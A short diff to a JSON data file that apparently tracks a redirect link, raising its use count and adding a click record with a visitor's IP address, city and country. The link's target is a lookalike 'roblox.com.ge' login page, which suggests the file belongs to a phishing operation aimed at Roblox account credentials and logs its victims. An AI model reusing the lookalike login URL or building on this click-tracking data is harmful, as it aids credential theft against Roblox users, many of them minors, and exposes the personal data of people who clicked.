@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1209,
+    "useCount": 1210,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9816,6 +9816,14 @@
         "city": "Makati City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777311453641,
+        "ip": "94.153.41.165",
+        "country": "Ukraine",
+        "city": "Kyiv",
+        "flag": "🇺🇦",
+        "countryCode": "UA"
       }
     ]
   },
